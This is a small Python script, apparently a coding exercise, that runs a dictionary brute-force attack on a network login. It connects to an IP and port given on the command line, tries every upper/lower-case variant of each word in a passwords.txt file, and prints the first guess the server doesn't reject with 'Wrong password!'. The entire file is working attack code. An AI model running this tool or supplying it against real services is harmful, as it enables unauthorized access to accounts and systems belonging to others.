import socket
import sys
import itertools
import os


def password_generator():
    with open(file_path) as file:
        passwords = file.read().splitlines()
    while True:
        for pas in passwords:
            for var in itertools.product(*([char.lower(), char.upper()] for char in pas)):
                yield var


def main():
    ip_address, port = sys.argv[1:]
    with socket.socket() as conn:
        conn.connect((ip_address, int(port)))
        massage = password_generator()
        while True:
            password = next(massage)
            conn.send(''.join(password).encode())
            response = conn.recv(1024)
            if response.decode() == 'Wrong password!':
                continue
            print(''.join(password))
            break


if __name__ == "__main__":
    file_path = os.path.join(os.path.dirname(__file__), "passwords.txt")
    main()
